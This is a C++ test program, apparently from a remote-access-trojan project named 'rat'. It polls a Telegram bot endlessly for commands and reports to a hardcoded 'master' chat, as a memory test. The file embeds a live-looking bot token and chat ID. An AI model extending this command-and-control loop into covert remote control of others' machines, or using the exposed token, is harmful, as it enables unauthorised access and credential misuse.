#include "rat/networking.hpp"
#include <chrono>
#include <string>
#include <thread>
#include <fmt/core.h>
#include <iostream>

#include "rat/tbot/debug.hpp"
#ifdef DEBUG_RAT_TBOT

static unsigned int iteration = 0;
#endif
#define TELEGRAM_BOT_API_BASE_URL "https://api.telegram.org/bot"

const std::string TOKEN = "5598026972:AAFtLSUld27ImilkcOppvGMFgSAPXozEgVo"; 
constexpr int64_t MASTER_ID = 1492536442; 
int main(void) {
    ::rat::networking::Client client(5, 1);
    
    constexpr size_t BUFFER_SIZE = 16 * 1024;
    std::vector<char> buffer(BUFFER_SIZE);
    
    std::string update_url = fmt::format("{}{}/getUpdates?timeout=1&limit=1&offset=0", 
                                       TELEGRAM_BOT_API_BASE_URL, TOKEN);
    
    std::string message_url = fmt::format("{}{}/sendMessage?chat_id={}&text=test", 
                                         TELEGRAM_BOT_API_BASE_URL, TOKEN, MASTER_ID);

    TBOT_DEBUG_LOG("Starting combined memory test");
    TBOT_DEBUG_LOG("Monitoring: 1 network call + 1 JSON parse per iteration");
    
    
    while (true) {
        TBOT_DEBUG_LOG("Iteration {}", iteration++);
        
        // 1. Network operation
        const auto response = client.sendHttpRequest(update_url.c_str(), buffer.data(), BUFFER_SIZE);
        std::cout << "Response: " << std::string(buffer.data(), response.size) << "\n";
        
        
        // 3. Send response
        {
            client.sendHttpRequest(message_url.c_str(), buffer.data(), BUFFER_SIZE);
        
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(2000)); // 2 second delay
    }
    
    return 0;
}
#undef TBOT_DEBUG_LOG
#undef TBOT_ERROR_LOG
#ifdef DEBUG_RAT_TBOT
    #undef DEBUG_RAT_TBOT
#endif
